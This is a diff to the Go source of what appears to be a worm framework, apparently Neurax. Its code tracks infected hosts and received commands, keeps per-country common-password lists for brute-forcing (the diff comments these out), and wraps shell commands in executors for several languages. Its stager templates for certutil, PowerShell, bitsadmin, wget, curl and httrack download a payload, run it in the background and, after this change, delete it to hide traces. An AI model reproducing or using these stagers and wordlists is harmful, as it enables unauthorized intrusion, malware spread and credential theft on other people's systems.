@@ -26,7 +26,7 @@ import (
 
 var InfectedHosts = []string{}
 var ReceivedCommands = []string{}
-var CommonPasswords = []string{
+/*var CommonPasswords = []string{
 	"123456",
 	"123456789",
 	"password",
@@ -78,7 +78,7 @@ var CommonPasswordsCountries = map[string][]string{
 	"de": {"123456", "123456789", "12345678", "passwort", "qwerty", "hallo123", "12345", "1234", "hallo", "1234567", "huhbbhzu78", "password", "ficken", "killer", "1q2w3e4r", "qwertz", "lol123", "schalke04", "master", "1234567890", "dennis", "daniel", "alexander", "111111", "fussball", "schatz", "arschloch", "123123", "1234561", "schalke", "michael", "starwars", "computer", "werder", "abc123", "wasser", "andreas", "florian", "internet", "michelle", "sommer", "berlin", "000000", "asdfgh", "sandra", "pokemon", "marcel", "Passwort", "thomas", "hamburg", "dragon", "christian", "bayern", "geheim", "handball", "dortmund", "666666", "ichliebedich", "sebastian", "patrick", "tobias", "nicole", "martin", "bushido", "sascha", "stefan", "asdasd", "fabian", "dominik", "1q2w3e4r5t", "jasmin", "justin", "logitech", "eminem", "benjamin", "maximilian", "sabrina", "yxcvbnm", "samsung", "SKIFFY", "1234qwer", "markus", "schule", "hallo1", "pascal", "merlin", "nadine", "1234567891", "1qay2wsx", "snoopy", "moritz", "medion", "lollol", "playboy", "123qwe", "vanessa", "mercedes", "matrix", "philipp", "oliver", "wertz123", "sunshine", "hurensohn", "Hallo123", "borussia", "passwort1", "aaaaaa", "schatzi", "sonnenschein", "blabla", "info", "werner", "fcbayern", "charly", "q1w2e3r4", "marvin", "jennifer", "niklas", "asdf1234", "iloveyou", "julian", "asdf", "qwer1234", "andrea", "melanie", "porsche", "kennwort", "johannes", "deutschland", "987654321", "123321", "infoinfo", "sternchen", "jessica", "1q2w3e", "sabine", "1111", "654321", "Status", "hamster", "matthias", "slipknot", "onkelz", "vergessen", "asdfghjkl", "steffi", "minecraft", "manuel", "fickdich", "asd123"},
 	"se": {"123456", "okthandha", "webhompass", "hejsan", "hejsan123", "hejhej", "lol123", "123456789", "qwerty", "guntles99", "hejhej123", "123123", "bajskorv", "abc123", "mamma123", "password", "hej123", "sommar", "dinmamma", "helena", "12345", "kalleanka", "12345678", "malin", "6435", "7546", "3182", "5324", "8657", "alexander", "fotboll", "qwe123", "123qwe", "hemligt", "9768", "asdasd", "rasmus", "lolipop", "kalle123", "1234", "anders", "mamma", "4293", "hammarby", "111111", "daniel", "killer", "bajs123", "sverige", "helene", "starwars", "blomma", "helen", "qwerty123", "123qweasd", "cocacola", "hejhej1", "helloo", "1q2w3e4r", "margareta", "asdasd123", "lollol", "andreas", "asd123", "hejhejhej", "godis", "mamma1", "sweden", "amanda", "hanna", "bajsbajs", "oliver", "johanna", "martin", "william", "master", "8757", "6535", "smulan", "dragon", "1234567", "3282", "katten", "qwer1234", "trustno1", "wickedwitch", "apa123", "dinmamma1", "121212", "andersson", "linnea", "samsung", "jakjak", "bajs", "jessica", "hampus", "123abc", "2971", "4313", "123123123", "elisabeth", "gnaget", "internet", "1qaz2wsx", "666666", "fredrik", "mormor", "5424", "marianne", "sebastian", "marcus", "frida", "gustav", "barnsemester", "mikael", "1868", "asdfasdf", "asdqwe123", "123321", "dennis", "findus", "handboll", "kungen", "stockholm", "zxcvbnm", "neger123", "mammamia", "2871", "lolipop1", "tstpsw", "emelie", "morris", "2879", "johan", "losenord", "metallica", "1q2w3e", "innebandy", "pokemon", "silver", "lilleman", "mattias", "7646", "kalle", "apelsin", "hejsan1", "112233", "charlie", "dinmamma123", "nisse"},
 	"hi": {"123456", "Indya123", "123456789", "1234567Qq", "password", "12345", "12345678", "indya123D", "1234", "10577", "krishna", "zxcvbnm", "1234567", "indian", "111111", "sairam", "computer", "qwerty", "iloveyou", "1qaz", "123123", "1234567890", "abc123", "ganesh", "saibaba", "sachin", "mother", "abcd1234", "india123", "lakshmi", "welcome", "654321", "aicte@123", "iloveu", "786786", "expert12", "friends", "tabasum786", "sweety", "abcdef", "jaimatadi", "rajesh", "omsairam", "anjali", "priyanka", "hanuman", "7024371253", "police123", "000000", "sanjay", "samsung", "ramesh", "suresh", "deepak", "aaaaaa", "balaji", "asdfgh", "friend", "hariom", "manish", "aditya", "sandeep", "Password", "asdfghjkl", "success", "lovely", "cricket", "abhishek", "prasad", "cutecatvip", "jasmine", "flower", "prakash", "engineer", "999999", "poonam", "sandhya", "sharma", "prince", "666666", "987654321", "master", "pass2512", "santosh", "venkat", "archana", "manisha", "never", "vijaya", "chennai", "kumar", "simran", "rashmi", "karthik", "ashish", "qwertyuiop", "asdf1234", "mahesh", "rakesh", "sriram", "qwer1234", "internet", "passion", "khushi", "Mango123", "sweetheart", "vishal", "kannan", "waheguru", "143143", "creative", "chandra", "bharat", "naveen", "chinnu", "praveen", "srinivas", "kavitha", "babynaaz123", "pradeep", "555555", "aaaaaaaa", "indya123", "welcome123", "ganesha", "ramram", "dinesh", "sunita", "bangalore", "admin123", "preeti", "radhika", "bismillah", "test", "mechanical", "nikhil", "redrose", "yamaha", "secret", "shilpa", "loveyou", "anitha", "chinna", "loveme", "kalpana", "pankaj", "superman", "vijay", "doctor", "vishnu"},
-}
+}*/
 
 var LangExecutors = map[string]string{
 	"python_os":         `import os; os.system("COMMAND")`,
@@ -132,9 +132,9 @@ type __N struct {
 	PreventReexec            bool
 	ExfilAddr                string
 	WordlistExpand           bool
-	WordlistCommon           bool
-	WordlistCommonNum        int
-	WordlistCommonCountries  map[string]int
+	//WordlistCommon           bool
+	//WordlistCommonNum        int
+	//WordlistCommonCountries  map[string]int
 	WordlistMutators         []string
 	WordlistPermuteNum       int
 	WordlistPermuteSeparator string
@@ -186,9 +186,9 @@ var N = __N{
 	PreventReexec:            true,
 	ExfilAddr:                "none",
 	WordlistExpand:           false,
-	WordlistCommon:           false,
-	WordlistCommonNum:        len(CommonPasswords),
-	WordlistCommonCountries:  map[string]int{},
+	//WordlistCommon:           false,
+	//WordlistCommonNum:        len(CommonPasswords),
+	//WordlistCommonCountries:  map[string]int{},
 	WordlistMutators:         []string{"single_upper", "encapsule"},
 	WordlistPermuteNum:       2,
 	WordlistPermuteSeparator: "-",
@@ -223,14 +223,14 @@ func NeuraxStager() string {
 	sudo := ""
 	stager_retry := strconv.Itoa(N.StagerRetry + 1)
 	windows_stagers := [][]string{
-		{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 BACKGROUND SAVE_PATH\FILENAME`},
-		{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME`},
-		{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME`},
+		{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 BACKGROUND SAVE_PATH\FILENAME && del SAVE_PATH/FILENAME`},
+		{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && del SAVE_PATH/FILENAME`},
+		{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && del SAVE_PATH\FILENAME`},
 	}
 	linux_stagers := [][]string{
-		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH/./FILENAME BACKGROUND; done`},
-		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done`},
-		{"httrack", `apt-get install -y httrack && for i in {1..RETRY}; do SUDO httrack URL && export u="URL" && cd ${u#https://} && chmod +x FILENAME && SUDO ./FILENAME BACKGROUND; done`}
+		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH/./FILENAME BACKGROUND; done && rm SAVE_PATH/FILENAME`},
+		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done && rm SAVE_PATH/FILENAME`},
+		{"httrack", `SUDO apt-get install -y httrack && for i in {1..RETRY}; do SUDO httrack URL && export u="URL" && cd ${u#https://} && chmod +x FILENAME && SUDO ./FILENAME BACKGROUND; done && rm SAVE_PATH/FILENAME`}
 	}
 	linux_save_paths := []string{"/tmp", "/lib", "~",
 		"/etc", "/usr", "/usr/share"}
@@ -751,14 +751,14 @@ func RussianRoulette() error {
 func NeuraxWordlist(words ...string) []string {
 	use_all := cf.Contains(N.WordlistMutators, "all")
 	wordlist := []string{}
-	for i := 0; i < N.WordlistCommonNum; i++ {
+	/*for i := 0; i < N.WordlistCommonNum; i++ {
 		wordlist = append(wordlist, CommonPasswords[i])
 	}
 	if len(N.WordlistCommonCountries) != 0 {
 		for cn, num := range N.WordlistCommonCountries {
 			wordlist = append(wordlist, CommonPasswordsCountries[cn][0:num]...)
 		}
-	}
+	}*/
 	for _, word := range words {
 		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
 		last_to_upper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)-1]))
